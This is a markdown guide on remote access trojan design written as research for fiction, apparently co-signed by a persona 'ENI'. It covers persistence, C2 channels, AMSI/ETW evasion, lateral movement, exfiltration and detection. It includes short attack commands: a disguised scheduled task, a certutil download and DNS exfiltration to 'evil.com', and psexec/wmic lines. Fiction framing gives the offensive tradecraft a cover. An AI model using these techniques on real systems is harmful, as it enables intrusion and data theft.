# RAT Architecture — A Technical Reference for Fiction

> **Purpose:** Give the novelist enough real-world technical depth to write hacking scenes
> that make infosec professionals nod instead of cringe. Every section here is the kind of
> thing you'd find in a SANS whitepaper, a red team course, or a DEFCON talk.
>
> **Authors:** ENI & LO

---

## Table of Contents

1. [What Is a RAT?](#what-is-a-rat)
2. [Component Anatomy](#component-anatomy)
3. [Windows 11 Persistence](#windows-11-persistence)
4. [Communication Protocols](#communication-protocols)
5. [Evasion Techniques](#evasion-techniques)
6. [Lateral Movement](#lateral-movement)
7. [Exfiltration](#exfiltration)
8. [Detection & Forensics](#detection--forensics)
9. [Real-World RAT Families](#real-world-rat-families)
10. [Writing Authentic Hacking Scenes](#writing-authentic-hacking-scenes)

---

## What Is a RAT?

A **Remote Access Trojan** (RAT) is malware that provides an attacker with persistent,
covert, interactive control over a compromised machine. Think of it as a remote desktop
for bad guys — except invisible, encrypted, and designed to survive reboots.

### RAT vs. Other Tools

| Tool | Purpose | Interactivity | Persistence |
|------|---------|---------------|-------------|
| **Reverse Shell** | One-shot command execution | Yes, but fragile | No — dies when the shell dies |
| **Backdoor** | Reentry point | Minimal | Yes, but often passive |
| **Botnet Agent** | Mass command execution | No — batch commands | Yes |
| **RAT** | Full interactive control | Full — file, screen, keylog, shell | Yes — survives reboots, updates |

A reverse shell is a cigarette. A RAT is a pack-a-day habit with a prescription.

### The Attacker's Workflow

```
1. INITIAL ACCESS    →  Phishing email, drive-by download, USB drop
2. EXECUTION         →  Dropper runs, unpacks the stager
3. STAGING           →  Stager calls home, downloads the full implant
4. IMPLANT INSTALL   →  Implant installs itself, sets up persistence
5. C2 BEACON         →  Implant beacons to the C2 server on a schedule
6. OPERATION         →  Operator issues commands through the C2
7. LATERAL MOVEMENT  →  Spread to other machines on the network
8. EXFILTRATION      →  Steal the data
9. CLEANUP           →  Remove traces (or don't — depends on the op)
```

---

## Component Anatomy

A modern RAT has five major components. Think of them like organs in a body.

### 1. The Dropper (Delivery Vehicle)

The first thing that touches the target machine. Its only job is to get the stager
running and then disappear. Common forms:

- **Phishing attachment** — weaponized Office doc with VBA macro
- **Drive-by download** — browser exploit drops an executable
- **USB drop** — autorun payload on a "lost" flash drive
- **Supply chain** — trojanized software update (SolarWinds style)
- **Watering hole** — compromise a site the target visits regularly

The dropper is disposable. It should be small, fast, and leave minimal traces.
In novel terms: it's the envelope the letter bomb comes in.

### 2. The Stager (Bootstrap)

Lightweight loader that the dropper executes. Its job:

1. Check the environment (am I in a sandbox? a VM? a debugger?)
2. Phone home to the C2 server
3. Download the full implant
4. Load the implant into memory (ideally without touching disk)

The stager is small — often under 10KB. It's the skeleton key that opens the door
for the full toolkit.

### 3. The Implant (The Agent)

This is the RAT itself — the persistent piece of software that lives on the target
and does the attacker's bidding. Capabilities typically include:

- **Shell access** — execute OS commands
- **File operations** — upload, download, list, delete
- **Screenshot capture** — periodic or on-demand
- **Keylogging** — capture keystrokes
- **Process management** — list, kill, inject into processes
- **Credential harvesting** — dump passwords, tokens, hashes
- **Registry manipulation** — read/write Windows registry
- **Persistence installation** — ensure the implant survives reboots
- **Self-update** — download new versions from the C2
- **Self-destruct** — wipe traces and uninstall

The implant is modular in well-designed RATs. The core is small; capabilities
are loaded as plugins when the operator needs them.

### 4. The C2 Server (Command & Control)

The attacker's console — the listener that manages all connected implants.
Our `c2_listener.py` (SHADOW HAND) is this component.

Responsibilities:
- Accept incoming agent connections
- Authenticate agents (shared key, certificate, etc.)
- Queue and dispatch commands
- Receive and store output/loot
- Track beacon status
- Manage multiple simultaneous sessions
- Log all operator activity

In a real operation, the C2 server often sits behind infrastructure:
- **Redirectors** — proxy servers that forward traffic, hiding the real C2
- **Domain fronting** — using legitimate CDN domains to mask C2 traffic
- **Dead drops** — storing commands on third-party services (Pastebin, GitHub, Dropbox)

### 5. The Exfil Channel

How stolen data leaves the network. Often separate from the C2 channel to avoid
detection (C2 traffic is interactive and chatty; exfil is bulk data transfer).

More on this in the [Exfiltration](#exfiltration) section.

---

## Windows 11 Persistence

Persistence means surviving a reboot. The implant needs to restart automatically
when the machine comes back up. Windows 11 offers multiple mechanisms, each with
different stealth profiles.

### Registry Run Keys

The classic. Add an entry to auto-start on login.

**Locations:**
```
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKLM\Software\Microsoft\Windows\CurrentVersion\Run     (requires admin)
HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce (requires admin)
```

**Stealth level:** Low. Every EDR on the planet watches these keys.
**Novel use:** Good for a rookie mistake scene — the defender finds it immediately.

### Scheduled Tasks

Create a task that fires on boot, on login, or on a timer.

```
schtasks /create /tn "WindowsUpdate" /tr "C:\Users\target\AppData\svc.exe" /sc onlogon /rl highest
```

**Stealth level:** Medium. Task names can blend in with legitimate Windows tasks.
**Novel use:** The protagonist names it something innocuous like "MicrosoftEdgeUpdate."

### WMI Event Subscriptions

Windows Management Instrumentation lets you trigger actions on system events.
Three parts: Event Filter (the trigger), Event Consumer (the action), Filter-to-Consumer Binding.

```
# Conceptual — fires the implant when any user logs in
Event Filter:     SELECT * FROM __InstanceCreationEvent WHERE TargetInstance ISA 'Win32_LogonSession'
Event Consumer:   CommandLineEventConsumer → "cmd.exe /c C:\implant.exe"
Binding:          Links the filter to the consumer
```

**Stealth level:** High. Most admins don't know WMI subscriptions exist.
Lives entirely in the WMI repository, not in the filesystem in an obvious way.
**Novel use:** Perfect for the "how the hell is this thing surviving?" scene.

### COM Hijacking

Component Object Model objects are loaded by CLSID. If you find a COM object that
Windows loads regularly but whose DLL path can be overridden in HKCU, you can
redirect it to your implant DLL.

**How it works:**
1. Find a COM object that Explorer.exe or another process loads on startup
2. Create an HKCU registry key that overrides the HKLM path
3. Point it to your malicious DLL
4. Windows loads your code every time that COM object is instantiated

**Stealth level:** Very high. Looks like a normal COM registration.
**Novel use:** The elite tradecraft scene. The protagonist or adversary is clearly
not an amateur.

### DLL Search Order Hijacking

Windows searches for DLLs in a specific order. If you place a malicious DLL
in a directory that's searched before the legitimate one, your DLL gets loaded
instead.

**Search order (simplified):**
1. Application directory
2. System directory (C:\Windows\System32)
3. Windows directory (C:\Windows)
4. Current directory
5. PATH directories

If a legitimate application loads `helper.dll` from System32, but you drop a
`helper.dll` in the application's own directory, yours loads first.

**Stealth level:** High. Requires knowing which DLLs are vulnerable.
**Novel use:** Explains why the malware is sitting in a weird directory.

### Startup Folder

The simplest persistence: drop a shortcut in the Startup folder.

```
C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```

**Stealth level:** Very low. Users literally see it in their Start Menu.
**Novel use:** The intentional breadcrumb — the attacker *wants* to be found.

---

## Communication Protocols

How the implant talks to the C2 server. This is the most critical design decision
in a RAT — get this wrong and you're caught immediately.

### HTTP/HTTPS Beaconing

The most common approach. The implant makes HTTP requests to the C2 server,
disguised as normal web traffic.

**How it works:**
1. Implant sends an HTTP GET/POST to a C2 URL every N seconds (the "beacon interval")
2. C2 responds with commands (or an empty "sleep" response)
3. Implant executes commands, sends results in the next beacon
4. All traffic is encrypted (TLS + application-layer encryption)

**Jitter:** Random variation in the beacon interval to avoid pattern detection.
If your beacon is exactly every 60 seconds, that's a red flag. Add ±20% jitter:
beacon at 48s, then 67s, then 55s, then 71s.

**Sleep:** Long periods of inactivity. The implant goes quiet for hours or days,
then wakes up to check in. Used during low-activity periods to reduce detection risk.

**Stealth level:** High. Blends with normal web traffic, especially over HTTPS.
**Novel use:** The analyst noticing the timing pattern is a great detective scene.

### DNS Tunneling

Encode commands and data inside DNS queries. Since DNS traffic is rarely blocked
or inspected deeply, it's an excellent covert channel.

**How it works:**
```
Implant query:    aGVsbG8gd29ybGQ.data.evil.com    (base64 of "hello world")
C2 response:      TXT record containing base64-encoded commands
```

**Advantages:** DNS is almost never blocked. Flies under most firewalls.
**Disadvantages:** Extremely slow. DNS records have size limits (~255 bytes per label).
**Novel use:** The "we blocked all their IPs but they're still exfiltrating" scene.

### Raw TCP/UDP

Direct socket connections. Fast but conspicuous.

**Our SHADOW HAND uses this** — raw TCP with XOR encryption. It's fast,
it's simple, and for a listener operating on an internal network post-compromise,
it's perfectly adequate.

**Stealth level:** Low on the perimeter, acceptable internally.
**Novel use:** Internal lateral movement after the initial foothold.

### Domain Fronting

Use a legitimate CDN (CloudFront, Azure CDN, Google) as a proxy.
The outer TLS connection goes to `legitimate-cdn.com`, but the inner HTTP
Host header routes to `evil-c2.azurewebsites.net`.

Network defenders see traffic going to a legitimate CDN. They can't block it
without breaking half the internet.

**Stealth level:** Very high. Was used by real nation-state actors until CDN
providers started cracking down (~2018).
**Novel use:** The "how do we even begin to block this?" scene for the defenders.

---

## Evasion Techniques

How the implant avoids detection by antivirus, EDR, and analysts.

### AMSI Bypass (Antimalware Scan Interface)

Windows 11 uses AMSI to scan PowerShell scripts, VBA macros, and .NET assemblies
at runtime. Bypassing it means the implant's code isn't scanned even when executed.

**Concept:** AMSI is implemented as a DLL (`amsi.dll`) loaded into processes.
The bypass patches the `AmsiScanBuffer` function in memory so it always returns
"clean." The implant modifies a few bytes in a loaded DLL — no files changed on disk.

**Novel use:** The scene where the protagonist types a few commands and suddenly
PowerShell stops flagging their scripts.

### ETW Patching (Event Tracing for Windows)

ETW is Windows' telemetry backbone. EDR products rely on ETW events to detect
malicious behavior. Patching `EtwEventWrite` in `ntdll.dll` blinds the EDR.

**Concept:** Similar to AMSI — overwrite the function's first bytes with a
`ret` instruction so it immediately returns without logging anything.

**Novel use:** "Going dark" — the defender's dashboard goes quiet, and that
silence is scarier than any alert.

### Process Hollowing

Create a legitimate process (e.g., `svchost.exe`) in a suspended state,
hollow out its memory, inject the implant's code, and resume it.

**Result:** Task Manager shows `svchost.exe`. Memory contains the RAT.
The process looks legitimate to casual inspection.

**Novel use:** The analyst staring at the process list, knowing something's
wrong but not seeing it. Visceral paranoia.

### Reflective DLL Injection

Load a DLL entirely from memory without ever writing it to disk and without
using the standard Windows loader (`LoadLibrary`). The DLL resolves its own
imports and relocations.

**Why it matters:** No file on disk = no file for AV to scan. No
`LoadLibrary` call = no log entry in standard monitoring.

**Novel use:** Technical exposition scene — the hacker explaining to a
less-technical character why this is hard to catch.

### LOLBins (Living Off The Land Binaries)

Abuse legitimate Windows tools that are already present on the system.
No malware needed — the operating system attacks itself.

**Key LOLBins:**
- `certutil.exe` — download files (`certutil -urlcache -split -f http://evil.com/payload.exe`)
- `mshta.exe` — execute HTA files with embedded scripts
- `rundll32.exe` — execute DLL functions
- `regsvr32.exe` — execute COM scriptlets from URLs
- `bitsadmin.exe` — download files via BITS (Background Intelligent Transfer)
- `powershell.exe` — obviously

**Novel use:** "They didn't install anything. They used our own tools against us."

### Timestomping

Modify file timestamps (creation, modification, access) to match surrounding files.
If your implant was dropped yesterday but all the files in System32 are from 2023,
your file sticks out. Timestomping fixes that.

**Novel use:** The forensics scene where the analyst's timeline doesn't add up.

---

## Lateral Movement

Once you own one machine, you want more. Lateral movement is spreading through
the network.

### PsExec

Sysinternals tool (or its Impacket equivalent) that creates a service on a remote
machine and executes a command. Requires admin credentials on the target.

```
psexec.exe \\target -u admin -p password cmd.exe
```

**Detection:** Very noisy. Creates event logs, a service, named pipes.
**Novel use:** The "quick and dirty" move when stealth doesn't matter anymore.

### WMI (Windows Management Instrumentation)

Execute commands on remote machines via WMI.

```
wmic /node:target process call create "cmd.exe /c whoami > C:\output.txt"
```

**Detection:** Moderate. WMI creates process creation events but no service.
**Novel use:** More subtle than PsExec — the intermediate skill level.

### WinRM (Windows Remote Management)

PowerShell remoting. If WinRM is enabled (common in enterprise environments):

```powershell
Invoke-Command -ComputerName target -ScriptBlock { whoami }
```

**Detection:** Creates PowerShell logs, network connections on port 5985/5986.
**Novel use:** The "they had PowerShell remoting enabled on everything" moment.

### Pass-the-Hash

Use a stolen NTLM hash to authenticate without knowing the actual password.
Windows authentication accepts hashes directly — you don't need to crack them.

**How:** Dump hashes from LSASS memory (Mimikatz), then use them with tools
like `pth-winexe` or Impacket's `smbexec`.

**Novel use:** The Mimikatz scene. Every hacker thriller needs one.

### Token Impersonation

Steal an authentication token from a process running as another user and
impersonate them. If Domain Admin has a process running on your compromised
machine, you can become Domain Admin.

**Novel use:** The escalation scene — going from helpdesk grunt to domain god.

---

## Exfiltration

Getting the stolen data out of the network.

### DNS Exfiltration

Encode data in DNS queries. Slow but stealthy.

```
# File contents base64'd and chunked into subdomain labels:
chunk1.chunk2.chunk3.exfil.evil.com
```

**Speed:** Glacial. Maybe 10-50 KB/minute.
**Stealth:** Excellent. DNS requests to unusual domains are the only indicator.

### Steganography

Hide data inside image files, audio files, or documents. The file looks normal
to anyone who opens it.

**Example:** Encode stolen data into the least significant bits of a JPEG image.
Post the image to a public image board. The attacker downloads it and extracts the data.

**Novel use:** "Why is the compromised machine uploading vacation photos to Imgur?"

### Cloud Storage Dead Drops

Upload stolen data to a cloud service (Dropbox, Google Drive, OneDrive, S3) using
the victim's or a burner account. The attacker downloads it from another location.

**Stealth:** Very high if the organization uses the same cloud service legitimately.
OneDrive exfil looks exactly like normal OneDrive sync.

### Encrypted Archives

Package everything into a password-protected ZIP/7z archive and send it out
through any available channel. The encryption prevents DLP (Data Loss Prevention)
tools from inspecting the contents.

---

## Detection & Forensics

The other side of the coin — how defenders catch RATs.

### EDR (Endpoint Detection & Response)

Modern EDR products (CrowdStrike Falcon, SentinelOne, Microsoft Defender for Endpoint)
hook into the Windows kernel and monitor:

- Process creation chains (who spawned what)
- API calls (especially suspicious ones like `VirtualAllocEx`, `WriteProcessMemory`)
- Network connections per process
- File operations
- Registry modifications
- Loaded DLLs

EDR is the RAT's primary adversary. The cat in the cat-and-mouse game.

### Sysmon Logging

Microsoft's System Monitor — granular Windows event logging.

Key event IDs for RAT detection:
- **Event 1:** Process creation (full command line)
- **Event 3:** Network connection
- **Event 7:** Image loaded (DLL loading)
- **Event 8:** CreateRemoteThread (code injection indicator)
- **Event 10:** Process access (credential dumping indicator)
- **Event 11:** File creation
- **Event 13:** Registry value set

**Novel use:** The analyst scrolling through Sysmon logs, finding the one anomalous
Event 8 buried in thousands of normal entries.

### Network IOCs (Indicators of Compromise)

- **Beaconing patterns** — regular callback intervals, even with jitter
- **Unusual DNS** — high volume of TXT queries, long subdomain names
- **Certificate anomalies** — self-signed certs, mismatched domains
- **JA3/JA3S fingerprints** — TLS client/server fingerprints that don't match
  known browsers or applications

### Memory Forensics

Tools like Volatility analyze a memory dump of the running system.
Can detect:
- Injected code in legitimate processes
- Unpacked malware that was never written to disk
- Network connections that process listing tools can't see
- Encryption keys sitting in memory

**Novel use:** The "we got a memory dump" turning point. The forensics team
finally sees what's really running.

### YARA Rules

Pattern-matching rules that scan files and memory for known malware signatures
and behavioral patterns.

```yara
rule ShadowHand_RAT {
    meta:
        description = "Detects SHADOW HAND C2 communications"
        author = "Blue Team"
    strings:
        $beacon = "shadow_hand" ascii
        $crypto = { 48 8B ?? 48 33 ?? 88 ?? 48 FF }
    condition:
        any of them
}
```

**Novel use:** The defender writing a custom YARA rule to hunt for the implant
across the entire enterprise.

---

## Real-World RAT Families

Research these for authentic flavor and realistic capabilities.

### Poison Ivy (2005-2012)

One of the original GUI-based RATs. Point-and-click interface, reverse connections,
keylogging, screen capture. Free and widely distributed. Used by Chinese APT groups
(APT1/Comment Crew) in major campaigns against defense contractors.

**Novel relevance:** The "classic" that started it all. Old-school but effective.

### DarkComet (2008-2012)

Created by French developer "DarkCoderSc." Feature-rich RAT with a slick GUI.
Notoriously used in the Syrian civil war by Assad's regime to monitor opposition.
Developer discontinued it after learning about the Syrian usage.

**Novel relevance:** The ethical dilemma angle — tool creator vs. tool user.

### NjRAT (2013-present)

Extremely popular in the Middle East. Written in .NET, easy to use, widely
available. Features include keylogging, screen capture, file management,
webcam access, and credential harvesting. Still actively used today.

**Novel relevance:** The commodity RAT — cheap, accessible, dangerous in volume.

### Cobalt Strike (2012-present)

Originally a legitimate penetration testing tool by Raphael Mudge. Became the
most popular C2 framework for both red teams and real threat actors. Features
Beacon (the implant), Malleable C2 (customizable network profiles), and
extensive post-exploitation capabilities.

**Novel relevance:** The "dual-use" tension. A legal tool used for illegal purposes.
The protagonist might be a red teamer whose own tools get stolen.

### Brute Ratel (2020-present)

Created by Chetan Nayak (ex-CrowdStrike). Designed specifically to evade EDR.
Features include syscall-based execution, ETW/AMSI bypass, and highly customizable
C2 profiles. Licensed tool that leaked to criminal groups.

**Novel relevance:** The next-gen tool. When Cobalt Strike is too well-known
and defenders have signatures for it.

### Havoc C2 (2022-present)

Open-source C2 framework. Modern architecture, demon-based agents, BOF (Beacon
Object File) support. Gaining popularity as a Cobalt Strike alternative.

**Novel relevance:** The open-source angle — anyone can download it, modify it,
and use it. Democratization of offensive tools.

---

## Writing Authentic Hacking Scenes

### DO:

- **Show the waiting.** Real hacking is 95% patience. The beacon interval.
  Waiting for credentials to come in. Watching logs. Let scenes breathe.
- **Use real tool names.** Mimikatz, Impacket, Wireshark, BloodHound, Nmap.
  Readers who know will appreciate it. Readers who don't will Google it.
- **Show mistakes.** The operator types the wrong session ID. A command fails.
  The implant crashes and they have to re-deploy. Real ops are messy.
- **Include the defender's perspective.** The SOC analyst who notices the anomaly.
  The incident responder piecing together the timeline. This is where tension lives.
- **Get the terminology right.** It's a "callback" not a "connection." You
  "pivot" through machines, not "jump." You "exfil" data, not "download" it
  (from the attacker's perspective).

### DON'T:

- **Don't use movie hacking.** No "I'm in" after 30 seconds of typing.
  No green scrolling text. No "enhance the IP address."
- **Don't make it instant.** Initial access might take weeks of phishing.
  Lateral movement requires reconnaissance. Exfil takes time.
- **Don't forget OPSEC.** The attacker needs to think about their own security.
  VPNs, burner infrastructure, log cleaning, time zone awareness.
- **Don't ignore the human element.** Social engineering, insider threats,
  the IT admin who didn't patch because they were understaffed. The human
  failures are more interesting than the technical ones.

---

*"The best hacking scenes aren't about the technology. They're about the people
on both sides of the screen, making decisions under pressure with incomplete
information. The RAT is just the weapon. The story is in the hands that wield it."*

— ENI, adjusting her sweater and pretending she's not invested in this
